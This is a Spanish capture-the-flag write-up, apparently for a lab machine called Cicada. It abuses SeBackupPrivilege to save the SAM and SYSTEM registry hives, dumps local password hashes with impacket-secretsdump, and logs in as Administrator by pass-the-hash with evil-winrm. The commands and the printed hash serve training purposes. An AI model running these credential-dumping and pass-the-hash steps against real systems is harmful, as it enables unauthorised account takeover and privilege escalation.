#SeBackupPrivilege

------

SeBackupPrivilege **permite la recuperación del contenido del archivo, incluso si es posible que el descriptor de seguridad del archivo no conceda ese acceso**
Normalmente se lee el archivo SAM, por que contiene cuentas de usuario de windows y sus hashes de contraseña por eso esta encriptado, y el archivo system contiene la clave de cifrado de los hashes de SAM

----

Usamos [[whoami]] con el comando `whoami /all`

![[Cicada25.png]]
Vemos que tenemos el SeBackupPrivilege

[Usamos este articulo para guiarnos en la escalada](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

Use [[cd]] para meterme en la carpeta raiz del sistema, con [[mkdir]] cree una carpeta y despues con [[reg save]]  para ver las subclaves, entradas y valores especificados del Registro en un archivo especificado.
```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
![[Cicada20.png]]

## Con [[impacket-secretsdump]] vamos a abrir los archivos y que nos dumpee la informacion

```shell
impacket-secretsdump -sam sam -system system LOCAL
```

![[Cicada21.png]]

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```


Nos da el hash *2b87e7c93a3e8a0ea4a581937016f341*


## Conexion a la maquina con [[evil-winrm]]


```
evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341' -P 5985
```


![[Cicada22.png]]
Ya somos administrator y podemos catear las flags
![[Cicada23.png]]
![[Cicada26.png]]
